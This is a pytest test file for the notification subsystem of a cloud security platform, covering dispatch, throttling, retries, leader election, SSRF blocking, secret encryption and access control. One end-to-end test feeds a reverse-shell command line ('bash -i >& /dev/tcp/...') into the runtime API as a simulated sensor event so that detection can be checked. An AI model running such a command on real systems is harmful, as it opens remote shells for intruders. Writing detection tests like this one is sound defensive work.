"""Notifications with the database and API: dispatcher (dedup/throttling,
retries/backoff/dead-letter, digests, quiet hours), leader-only sending,
secret handling, RBAC, audit, and the end-to-end path from a runtime alert.

Runs on SQLite and PostgreSQL (TEST_DATABASE_URL). All outbound calls are
replaced by an in-memory fake; nothing leaves the machine.
"""
from __future__ import annotations

import json
import threading
from datetime import datetime, timedelta

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import func, select

from app import config, db
from app.models import AuditLog, utcnow
from app.notifications import Event, crypto, dispatcher, emit, ssrf
from app.notifications import channels as ch
from app.notifications.models import (
    NotificationChannel,
    NotificationDelivery,
    NotificationDigestItem,
    NotificationEvent,
    NotificationRule,
    NotificationThrottle,
)
from app.notifications.worker import NotificationWorker
from tests.conftest import AUTH, BASE_URL, login, make_user

SLACK_URL = "https://hooks.slack.com/services/T000/B000/VERYSECRETTOKEN"
T0 = datetime(2026, 10, 15, 12, 0, 0)


class FakeTransport:
    """Stands in for ssrf.post: records requests, answers with queued statuses."""

    def __init__(self):
        self.requests: list[dict] = []
        self.statuses: list[int] = []
        self.lock = threading.Lock()

    def __call__(self, url, body, headers, *, kind):
        with self.lock:
            self.requests.append({"url": url, "body": json.loads(body), "headers": headers, "kind": kind})
            status = self.statuses.pop(0) if self.statuses else 200
        return ssrf.HttpResponse(status, b"ok" if status < 400 else b"boom " + url.encode(), {})


@pytest.fixture()
def transport(monkeypatch):
    t = FakeTransport()
    monkeypatch.setattr(ssrf, "post", t)
    monkeypatch.setenv("PUBLIC_BASE_URL", "https://cnapp.example.com")
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", crypto.generate_key())
    return t


def add_channel(s, name="SOC Slack", ctype="slack", secrets=None, enabled=True):
    secrets = secrets or {"webhook_url": SLACK_URL}
    c = NotificationChannel(name=name, type=ctype, enabled=enabled, config={},
                            secret_ciphertext=crypto.encrypt_secrets(secrets), secret_hints=ch.hints(ctype, secrets))
    s.add(c)
    s.commit()
    return c


def add_rule(s, channel_ids, **over):
    fields = dict(name="High+", sources=[], event_types=[], min_severity="high", subscription_ids=[], asset_ids=[],
                  asset_types=[], tags={}, rule_ids=[], mitre_techniques=[], channel_ids=channel_ids,
                  throttle_minutes=60, mode="immediate", digest_hour=8, timezone="UTC")
    fields.update(over)
    r = NotificationRule(**fields)
    s.add(r)
    s.commit()
    return r


def add_event(s, severity="high", group="g1", created=T0, **over):
    row = emit(s, Event(source=over.pop("source", "runtime_alert"), event_type=over.pop("event_type", "created"),
                        severity=severity, title=over.pop("title", f"{severity} thing"), group_key=group,
                        link_path="/threats?alert=x", **over))
    row.created_at = created
    s.commit()
    return row


def deliveries(s):
    s.expire_all()
    return list(s.scalars(select(NotificationDelivery).order_by(NotificationDelivery.created_at,
                                                                 NotificationDelivery.id)))


# --- rule routing, dedup & throttling ---------------------------------------------------

def test_events_are_routed_to_matching_channels(session, transport):
    a, b = add_channel(session, "A"), add_channel(session, "B")
    add_rule(session, [a.id, b.id], min_severity="high")
    add_event(session, "critical", "g1")
    add_event(session, "low", "g2")  # below threshold
    assert dispatcher.process_events(session, T0) == 2
    ds = deliveries(session)
    assert sorted(d.channel_name for d in ds) == ["A", "B"] and all(d.severity == "critical" for d in ds)
    assert dispatcher.process_events(session, T0) == 0  # processed once
    assert dispatcher.send_due(session, T0)["sent"] == 2
    assert len(transport.requests) == 2
    assert transport.requests[0]["url"] == SLACK_URL
    assert "https://cnapp.example.com/threats?alert=x" in json.dumps(transport.requests[0]["body"])


def test_dedup_and_throttling(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id], throttle_minutes=30)
    for i in range(3):
        add_event(session, "high", "same-group", created=T0 + timedelta(seconds=i))
    add_event(session, "high", "other-group")
    dispatcher.process_events(session, T0)
    assert [d.title for d in deliveries(session)] == ["high thing", "high thing"]  # one per group
    t = session.scalar(select(NotificationThrottle).where(NotificationThrottle.group_key == "same-group"))
    assert t.suppressed == 2
    # inside the window: still suppressed
    add_event(session, "high", "same-group", created=T0 + timedelta(minutes=10))
    dispatcher.process_events(session, T0 + timedelta(minutes=10))
    assert len(deliveries(session)) == 2
    # after the window: delivered, mentioning what was suppressed
    add_event(session, "high", "same-group", created=T0 + timedelta(minutes=31))
    dispatcher.process_events(session, T0 + timedelta(minutes=31))
    ds = deliveries(session)
    assert len(ds) == 3 and ds[-1].message["suppressed"] == 3
    assert "3 similar" in dict(ds[-1].message["facts"])["Suppressed"]


def test_throttle_zero_sends_every_event(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id], throttle_minutes=0)
    for _ in range(3):
        add_event(session, "high", "g")
    dispatcher.process_events(session, T0)
    assert len(deliveries(session)) == 3


def test_status_changes_only_when_enabled(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id], name="default")
    add_event(session, "high", "s1", event_type="status_changed")
    dispatcher.process_events(session, T0)
    assert deliveries(session) == []
    add_rule(session, [c.id], name="with status", include_status_changes=True)
    add_event(session, "high", "s2", event_type="status_changed")
    dispatcher.process_events(session, T0)
    assert [d.rule_name for d in deliveries(session)] == ["with status"]


def test_disabled_channel_and_rule_are_skipped(session, transport):
    off = add_channel(session, "off", enabled=False)
    on = add_channel(session, "on")
    add_rule(session, [off.id, on.id])
    add_rule(session, [on.id], name="disabled", enabled=False)
    add_event(session, "critical")
    dispatcher.process_events(session, T0)
    assert [(d.channel_name, d.rule_name) for d in deliveries(session)] == [("on", "High+")]


def test_quiet_hours_hold_deliveries(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id], quiet_start="22:00", quiet_end="07:00", quiet_bypass_severity="critical",
             throttle_minutes=0)
    night = datetime(2026, 10, 15, 23, 0)
    add_event(session, "high", "q1", created=night)
    add_event(session, "critical", "q2", created=night)
    dispatcher.process_events(session, night)
    held, urgent = sorted(deliveries(session), key=lambda d: d.severity != "high")
    assert held.next_attempt_at == datetime(2026, 10, 16, 7, 0) and "quiet hours" in held.last_error
    assert urgent.next_attempt_at == night
    assert dispatcher.send_due(session, night)["sent"] == 1
    assert dispatcher.send_due(session, datetime(2026, 10, 16, 7, 0))["sent"] == 1
    assert deliveries(session)[0].last_error is None


def test_daily_digest(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id], name="Low digest", min_severity="low", mode="digest", digest_hour=8)
    for i, sev in enumerate(["low", "medium", "high"]):
        add_event(session, sev, f"d{i}", title=f"item {i}")
    dispatcher.process_events(session, datetime(2026, 10, 15, 6, 0))
    assert deliveries(session) == [] and session.scalar(select(func.count()).select_from(NotificationDigestItem)) == 3
    assert dispatcher.flush_digests(session, datetime(2026, 10, 15, 7, 59)) == 0
    assert dispatcher.flush_digests(session, datetime(2026, 10, 15, 8, 0)) == 1
    (d,) = deliveries(session)
    assert d.kind == "digest" and d.message["total"] == 3 and d.severity == "high"
    assert [i["title"] for i in d.message["items"]] == ["item 2", "item 1", "item 0"]  # worst first
    assert dispatcher.flush_digests(session, datetime(2026, 10, 15, 20, 0)) == 0  # once per day
    assert session.scalar(select(func.count()).select_from(NotificationDigestItem)) == 0


# --- retries, backoff, dead-letter -----------------------------------------------------------

def test_backoff_is_exponential_and_capped(monkeypatch):
    monkeypatch.setenv("NOTIFICATIONS_BACKOFF_BASE_SECONDS", "30")
    monkeypatch.setenv("NOTIFICATIONS_BACKOFF_MAX_SECONDS", "600")
    assert [dispatcher.backoff_seconds(n, jitter=False) for n in (1, 2, 3, 4, 5, 6)] == [30, 60, 120, 240, 480, 600]
    assert dispatcher.backoff_seconds(1, retry_after=300, jitter=False) == 300
    assert dispatcher.backoff_seconds(1, retry_after=10_000, jitter=False) == 600
    assert 24 <= dispatcher.backoff_seconds(1) <= 36


def test_retries_then_dead_letter(session, transport, monkeypatch):
    monkeypatch.setenv("NOTIFICATIONS_MAX_ATTEMPTS", "3")
    c = add_channel(session)
    add_rule(session, [c.id])
    add_event(session, "critical")
    dispatcher.process_events(session, T0)
    transport.statuses = [503, 503, 503]
    now = T0
    for attempt in (1, 2):
        dispatcher.send_due(session, now)
        (d,) = deliveries(session)
        assert d.status == "pending" and d.attempts == attempt and d.next_attempt_at > now
        assert "SECRETTOKEN" not in d.last_error and "[REDACTED]" in d.last_error  # URL echoed by server is redacted
        assert dispatcher.send_due(session, now)["sent"] == 0  # not due yet
        now = d.next_attempt_at
    dispatcher.send_due(session, now)
    (d,) = deliveries(session)
    assert d.status == "dead" and d.attempts == 3 and d.response_status == 503
    assert len(transport.requests) == 3


def test_permanent_error_dead_letters_immediately(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id])
    add_event(session, "critical")
    dispatcher.process_events(session, T0)
    transport.statuses = [404]
    dispatcher.send_due(session, T0)
    (d,) = deliveries(session)
    assert d.status == "dead" and d.attempts == 1 and d.response_status == 404


def test_transient_then_success(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id])
    add_event(session, "critical")
    dispatcher.process_events(session, T0)
    transport.statuses = [429, 200]
    dispatcher.send_due(session, T0)
    (d,) = deliveries(session)
    dispatcher.send_due(session, d.next_attempt_at)
    (d,) = deliveries(session)
    assert d.status == "sent" and d.attempts == 2 and d.last_error is None and d.sent_at is not None


def test_ssrf_block_at_send_time_is_permanent(session, monkeypatch):
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", crypto.generate_key())
    monkeypatch.setattr(ssrf.socket, "getaddrinfo",
                        lambda host, port, *a, **k: [(2, 1, 6, "", ("169.254.169.254", port))])
    c = add_channel(session, ctype="webhook", secrets={"url": "https://rebound.example.com/x", "signing_secret": "s" * 32})
    add_rule(session, [c.id])
    add_event(session, "critical")
    dispatcher.process_events(session, T0)
    dispatcher.send_due(session, T0)
    (d,) = deliveries(session)
    assert d.status == "dead" and "blocked" in d.last_error and "link-local" in d.last_error


def test_deleted_channel_and_stuck_sending_recovery(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id], throttle_minutes=0)
    add_event(session, "critical")
    add_event(session, "critical")
    dispatcher.process_events(session, T0)
    d1, d2 = deliveries(session)
    d1.status, d1.last_attempt_at = "sending", T0  # worker died mid-send
    session.commit()
    assert dispatcher.send_due(session, T0 + timedelta(minutes=1))["sent"] == 1  # lease not expired yet
    assert dispatcher.send_due(session, T0 + timedelta(minutes=6))["sent"] == 1  # re-sent (at-least-once)
    session.delete(session.get(NotificationChannel, c.id))
    session.commit()
    add_event(session, "critical")
    assert dispatcher.process_events(session, T0) == 1 and len(deliveries(session)) == 2


def test_undecryptable_secrets_dead_letter(session, transport, monkeypatch):
    c = add_channel(session)
    add_rule(session, [c.id])
    add_event(session, "critical")
    dispatcher.process_events(session, T0)
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", crypto.generate_key())  # key lost / rotated away
    dispatcher.send_due(session, T0)
    (d,) = deliveries(session)
    assert d.status == "dead" and "decrypted" in d.last_error


# --- leader election ----------------------------------------------------------------------

def test_only_the_leader_sends(session, transport):
    c = add_channel(session)
    add_rule(session, [c.id], throttle_minutes=0)
    for i in range(3):
        add_event(session, "critical", f"g{i}")
    workers = [NotificationWorker(interval=3600), NotificationWorker(interval=3600)]
    results = {}

    def tick(i):
        results[i] = workers[i].tick(utcnow())

    try:
        for i in (0, 1):  # each "replica" from its own thread
            t = threading.Thread(target=tick, args=(i,))
            t.start()
            t.join()
        assert sorted(r is None for r in results.values()) == [False, True]
        leader = 0 if results[0] is not None else 1
        assert results[leader]["sent"]["sent"] == 3 and len(transport.requests) == 3
        assert workers[leader].is_leader and not workers[1 - leader].is_leader
        workers[leader].stop()  # leader goes away: the other one takes over
        add_event(session, "critical", "g-new")
        t = threading.Thread(target=tick, args=(1 - leader,))
        t.start()
        t.join()
        assert results[1 - leader] is not None and len(transport.requests) == 4
    finally:
        for w in workers:
            w._stop.set()
            w._leader.release()


# --- producers -------------------------------------------------------------------------------

def test_runtime_alert_end_to_end(client, transport):
    """Sensor event -> detection -> alert -> notification event (same transaction) -> Slack."""
    c = client.post("/api/notifications/channels", json={"name": "SOC", "type": "slack",
                                                          "secrets": {"webhook_url": SLACK_URL}}).json()
    r = client.post("/api/notifications/rules", json={"name": "Shells", "sources": ["runtime_alert"],
                                                       "min_severity": "medium", "channel_ids": [c["id"]],
                                                       "mitre_techniques": ["T1059"]})
    assert r.status_code == 201, r.text
    with db.get_session() as s:  # ignore the seeded history
        while dispatcher.process_events(s):
            pass
        before = s.scalar(select(func.count()).select_from(NotificationDelivery))
    asset = client.get("/api/assets", params={"type": "vm"}).json()[0]
    ev = {"event_type": "process_exec", "asset_id": asset["id"],
          "process": {"name": "bash", "cmdline": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "user": "www-data"}}
    res = client.post("/api/runtime/events", json=ev, headers=AUTH).json()
    assert res["alerts_triggered"] >= 1
    with db.get_session() as s:
        queued = s.scalars(select(NotificationEvent).where(NotificationEvent.processed_at.is_(None))).all()
        assert any(e.source == "runtime_alert" and e.entity_id in res["alert_ids"] for e in queued)
        dispatcher.process_events(s)
        dispatcher.send_due(s)
        assert s.scalar(select(func.count()).select_from(NotificationDelivery)) > before
    body = json.dumps(transport.requests[-1]["body"])
    assert "https://cnapp.example.com/threats?alert=" in body
    log = client.get("/api/notifications/deliveries").json()
    assert log[0]["status"] == "sent" and log[0]["link"].startswith("https://cnapp.example.com/threats?alert=")


def test_status_change_and_finding_events(client, transport):
    alert = client.get("/api/alerts").json()[0]
    finding = client.get("/api/findings").json()[0]
    assert client.patch(f"/api/alerts/{alert['id']}", json={"status": "acknowledged"}).status_code == 200
    assert client.patch(f"/api/findings/{finding['id']}", json={"status": "suppressed"}).status_code == 200
    with db.get_session() as s:
        rows = s.scalars(select(NotificationEvent).where(NotificationEvent.event_type == "status_changed")).all()
        assert {(r.source, r.entity_id) for r in rows} == {("runtime_alert", alert["id"]),
                                                          ("posture_finding", finding["id"])}
        assert all(r.attributes["actor"] == "admin@example.com" for r in rows)
        # seeding emitted findings / vulnerabilities / alerts through the same hooks
        sources = {src for (src,) in s.execute(select(NotificationEvent.source).distinct())}
        assert {"runtime_alert", "posture_finding", "vulnerability"} <= sources


def test_attack_path_poller_baseline_then_new(client, transport):
    from app.notifications.models import NotificationSourceState

    with db.get_session() as s:
        assert dispatcher.poll_sources(s, force=True) == 0  # first poll: baseline only
        st = s.get(NotificationSourceState, "attack_path")
        assert st.state["initialized"] and st.state["seen"]
        st.state = {"initialized": True, "seen": st.state["seen"][1:]}  # forget one: it is "new" now
        s.commit()
        assert dispatcher.poll_sources(s, now=utcnow()) == 0  # not due yet
        assert dispatcher.poll_sources(s, force=True) == 1
        ev = s.scalars(select(NotificationEvent).where(NotificationEvent.source == "attack_path")).one()
        assert ev.link_path.startswith("/attack-paths?path=")


# --- API: secrets, RBAC, audit -----------------------------------------------------------------

def _audit(action):
    with db.get_session() as s:
        return s.scalars(select(AuditLog).where(AuditLog.action == action)).all()


def test_channel_secrets_are_encrypted_and_never_returned(client, transport):
    r = client.post("/api/notifications/channels", json={
        "name": "Hook", "type": "webhook",
        "secrets": {"url": "https://hooks.example.com/in/TOKEN123456", "signing_secret": "z" * 40}})
    assert r.status_code == 201, r.text
    ch_out = r.json()
    raw = json.dumps(ch_out)
    assert "TOKEN123456" not in raw and "z" * 40 not in raw and "secrets" not in ch_out
    assert ch_out["secret_hints"] == {"url": "https://hooks.example.com/••••••", "signing_secret": "••••zzzz"}
    for path in ("/api/notifications/channels", f"/api/notifications/channels/{ch_out['id']}"):
        assert "TOKEN123456" not in client.get(path).text
    with db.get_session() as s:
        row = s.get(NotificationChannel, ch_out["id"])
        assert "TOKEN123456" not in row.secret_ciphertext and "TOKEN123456" not in json.dumps(row.config)
        assert crypto.decrypt_secrets(row.secret_ciphertext)["url"].endswith("TOKEN123456")
    # update without secrets keeps them; with one secret replaces only that one
    r = client.patch(f"/api/notifications/channels/{ch_out['id']}", json={"name": "Hook 2"})
    assert r.status_code == 200 and r.json()["secret_hints"]["url"] == "https://hooks.example.com/••••••"
    r = client.patch(f"/api/notifications/channels/{ch_out['id']}", json={"secrets": {"signing_secret": "y" * 40}})
    assert r.status_code == 200 and r.json()["secret_hints"]["signing_secret"] == "••••yyyy"
    with db.get_session() as s:
        sec = crypto.decrypt_secrets(s.get(NotificationChannel, ch_out["id"]).secret_ciphertext)
        assert sec == {"url": "https://hooks.example.com/in/TOKEN123456", "signing_secret": "y" * 40}
    entries = _audit("notification_channel_created") + _audit("notification_channel_updated")
    assert len(entries) == 3
    assert all("TOKEN123456" not in json.dumps(e.detail) and "y" * 40 not in json.dumps(e.detail) for e in entries)
    assert entries[-1].detail["changes"]["secrets_changed"] == ["signing_secret"]


def test_channel_validation_errors(client, transport):
    bad = [
        {"name": "x", "type": "slack", "secrets": {"webhook_url": "https://example.com/hook"}},
        {"name": "x", "type": "slack", "secrets": {"webhook_url": "http://hooks.slack.com/x"}},
        {"name": "x", "type": "webhook", "secrets": {"url": "https://169.254.169.254/", "signing_secret": "s" * 40}},
        {"name": "x", "type": "teams", "secrets": {}},
        {"name": "x", "type": "pagerduty", "secrets": {}},
    ]
    for body in bad:
        assert client.post("/api/notifications/channels", json=body).status_code == 422, body


def test_production_without_key_refuses_to_store_secrets(client, transport, monkeypatch):
    monkeypatch.delenv("NOTIFICATIONS_ENCRYPTION_KEY")
    monkeypatch.setenv("APP_ENV", "production")
    config.reload_settings()
    try:
        r = client.post("/api/notifications/channels", json={"name": "x", "type": "slack",
                                                              "secrets": {"webhook_url": SLACK_URL}})
        assert r.status_code == 503 and "NOTIFICATIONS_ENCRYPTION_KEY" in r.json()["detail"]
    finally:
        monkeypatch.setenv("APP_ENV", "development")
        config.reload_settings()


def test_test_send_and_delivery_log(client, transport):
    c = client.post("/api/notifications/channels", json={"name": "SOC", "type": "slack",
                                                          "secrets": {"webhook_url": SLACK_URL}}).json()
    r = client.post(f"/api/notifications/channels/{c['id']}/test")
    assert r.status_code == 200 and r.json()["ok"] is True
    assert "Test notification" in json.dumps(transport.requests[-1]["body"])
    transport.statuses = [500]
    r = client.post(f"/api/notifications/channels/{c['id']}/test").json()
    assert r["ok"] is False and r["delivery"]["status"] == "dead" and "SECRETTOKEN" not in json.dumps(r)
    assert client.get(f"/api/notifications/channels/{c['id']}").json()["last_test_status"] == "failed"
    log = client.get("/api/notifications/deliveries", params={"kind": "test"}).json()
    assert [d["status"] for d in log] == ["dead", "sent"]
    assert len(_audit("notification_channel_tested")) == 2
    # dead-lettered event deliveries can be retried by an admin
    with db.get_session() as s:
        d = NotificationDelivery(channel_id=c["id"], channel_name="SOC", channel_type="slack", kind="event",
                                 title="x", message={"title": "x"}, status="dead", attempts=6)
        s.add(d)
        s.commit()
        did = d.id
    r = client.post(f"/api/notifications/deliveries/{did}/retry")
    assert r.status_code == 200 and r.json()["status"] == "pending" and r.json()["attempts"] == 0
    assert client.post(f"/api/notifications/deliveries/{did}/retry").status_code == 409


def test_rule_crud_validation_and_channel_delete(client, transport):
    c = client.post("/api/notifications/channels", json={"name": "SOC", "type": "slack",
                                                          "secrets": {"webhook_url": SLACK_URL}}).json()
    base = {"name": "Crit", "min_severity": "critical", "channel_ids": [c["id"]]}
    for bad in ({**base, "channel_ids": ["nope"]}, {**base, "sources": ["nope"]},
                {**base, "mitre_techniques": ["X1"]}, {**base, "quiet_start": "25:00", "quiet_end": "07:00"},
                {**base, "quiet_start": "22:00"}, {**base, "timezone": "Mars/Base"}, {**base, "channel_ids": []},
                {**base, "min_severity": "urgent"}):
        assert client.post("/api/notifications/rules", json=bad).status_code == 422, bad
    r = client.post("/api/notifications/rules", json={**base, "tags": {"env": "prod"}, "mitre_techniques": ["t1059"],
                                                       "quiet_start": "22:00", "quiet_end": "07:00",
                                                       "timezone": "Europe/London"})
    assert r.status_code == 201, r.text
    rule = r.json()
    assert rule["mitre_techniques"] == ["T1059"]
    r = client.put(f"/api/notifications/rules/{rule['id']}", json={**base, "name": "Crit 2", "mode": "digest"})
    assert r.status_code == 200 and r.json()["mode"] == "digest"
    assert _audit("notification_rule_updated")[0].detail["changes"]["name"] == ["Crit", "Crit 2"]
    assert client.delete(f"/api/notifications/channels/{c['id']}").status_code == 204
    assert client.get("/api/notifications/rules").json()[0]["channel_ids"] == []
    assert client.delete(f"/api/notifications/rules/{rule['id']}").status_code == 204
    assert client.get("/api/notifications/rules").json() == []
    assert {"notification_channel_deleted", "notification_rule_deleted", "notification_rule_created"} <= {
        e.action for e in _audit("notification_channel_deleted") + _audit("notification_rule_deleted")
        + _audit("notification_rule_created")}


def test_rbac(client, transport):
    make_user(client, "viewer")
    make_user(client, "analyst")
    c = client.post("/api/notifications/channels", json={"name": "SOC", "type": "slack",
                                                          "secrets": {"webhook_url": SLACK_URL}}).json()
    rule = client.post("/api/notifications/rules", json={"name": "r", "channel_ids": [c["id"]]}).json()
    reads = ["/api/notifications/meta", "/api/notifications/status", "/api/notifications/channels",
             f"/api/notifications/channels/{c['id']}", "/api/notifications/rules", "/api/notifications/deliveries",
             "/api/notifications/preview?channel_type=teams"]
    writes = [("POST", "/api/notifications/channels", {"name": "x", "type": "slack",
                                                        "secrets": {"webhook_url": SLACK_URL}}),
              ("PATCH", f"/api/notifications/channels/{c['id']}", {"name": "y"}),
              ("DELETE", f"/api/notifications/channels/{c['id']}", None),
              ("POST", f"/api/notifications/channels/{c['id']}/test", None),
              ("POST", "/api/notifications/rules", {"name": "x", "channel_ids": [c["id"]]}),
              ("PUT", f"/api/notifications/rules/{rule['id']}", {"name": "x", "channel_ids": [c["id"]]}),
              ("DELETE", f"/api/notifications/rules/{rule['id']}", None),
              ("POST", "/api/notifications/deliveries/x/retry", None)]
    viewer = TestClient(client.app, base_url=BASE_URL)
    login(viewer, "viewer@example.com", "a-long-test-password")
    analyst = TestClient(client.app, base_url=BASE_URL)
    login(analyst, "analyst@example.com", "a-long-test-password")
    for path in reads:
        assert viewer.get(path).status_code == 403, path
        assert analyst.get(path).status_code == 200, path
    assert SLACK_URL not in analyst.get("/api/notifications/channels").text
    for method, path, body in writes:
        assert analyst.request(method, path, json=body).status_code == 403, (method, path)
        assert viewer.request(method, path, json=body).status_code == 403, (method, path)
    assert transport.requests == []  # no test message was sent by anyone but an admin
    anon = TestClient(client.app, base_url=BASE_URL)
    assert anon.get("/api/notifications/channels").status_code == 401


def test_meta_and_preview(client, transport):
    m = client.get("/api/notifications/meta").json()
    assert {t["type"] for t in m["channel_types"]} == {"teams", "slack", "email", "webhook"}
    assert {"runtime_alert", "posture_finding", "vulnerability", "attack_path", "scan"} <= {s["name"] for s in m["sources"]}
    assert m["public_base_url"] == "https://cnapp.example.com" and m["encryption_configured"] is True
    teams = client.get("/api/notifications/preview", params={"channel_type": "teams"}).json()
    assert teams["attachments"][0]["content"]["type"] == "AdaptiveCard"
    status = client.get("/api/notifications/status").json()
    assert status["worker_running"] is False and "pending" in status["deliveries"]


def test_emit_never_breaks_the_producer(session):
    assert emit(session, Event(source="Bad Source!", event_type="x", severity="high", title="t")) is None
    row = emit(session, Event(source="device", event_type="encryption_off", severity="weird", title="t" * 500,
                              attributes={"tags": {"team": "a"}}))
    session.commit()
    assert row.severity == "info" and len(row.title) == 255 and row.group_key.startswith("device:")


def test_cleanup_removes_old_rows(session, transport, monkeypatch):
    monkeypatch.setenv("NOTIFICATIONS_RETENTION_DAYS", "7")
    c = add_channel(session)
    add_rule(session, [c.id])
    add_event(session, "critical")
    dispatcher.process_events(session, T0)
    dispatcher.send_due(session, T0)
    dispatcher.cleanup(session, T0 + timedelta(days=3))
    assert len(deliveries(session)) == 1
    session.get(NotificationDelivery, deliveries(session)[0].id).created_at = T0
    session.commit()
    dispatcher.cleanup(session, T0 + timedelta(days=8))
    assert deliveries(session) == []
    assert session.scalar(select(func.count()).select_from(NotificationEvent)) == 0


def test_cli_rotates_channel_key(session, monkeypatch, capsys):
    from app import cli

    old, new = crypto.generate_key(), crypto.generate_key()
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", old)
    c = add_channel(session)
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", f"{new},{old}")
    monkeypatch.setattr(db, "init_engine", lambda *a, **k: db.engine)  # keep the test database
    assert cli.main(["rotate-notification-key"]) == 0
    assert "1 notification channel" in capsys.readouterr().out
    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", new)
    session.expire_all()
    assert crypto.decrypt_secrets(session.get(NotificationChannel, c.id).secret_ciphertext)["webhook_url"] == SLACK_URL
